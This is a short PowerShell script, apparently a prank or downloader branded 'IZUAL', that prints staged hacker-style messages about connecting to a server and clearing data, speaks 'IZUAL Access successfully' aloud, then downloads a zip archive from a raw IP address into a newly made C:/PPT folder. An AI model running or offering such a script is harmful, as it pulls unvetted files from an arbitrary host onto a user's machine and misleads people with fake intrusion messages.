echo "------------------------------------------------------------------"
echo " Copyright 2019-2021 Miracle-T all rights reserved | icscraft.top "
echo "------------------------------------------------------------------"
echo "[IZUAL]Init..."
echo "[IZUAL]Setting permissions..."
echo "[IZUAL]Connecting to 116.23.71.144:10222..."
echo "[IZUAL]Clear data..."
echo "[IZUAL]Successfully!"
Measure-Command {echo "[IZUAL]Successfully!"}
$client = new-object System.Net.WebClient
Add-Type -AssemblyName System.speech
$speak = New-Object System.Speech.Synthesis.SpeechSynthesizer
$speak.SelectVoice('Microsoft Zira Desktop')
$speak.Speak("IZUAL Access successfully")
mkdir C:/PPT/
$client.DownloadFile("http://60.179.34.67:2811/e/file/download?code=521401215882a2ea&id=215139" , "1.zip")
mv "1.zip" C:/PPT/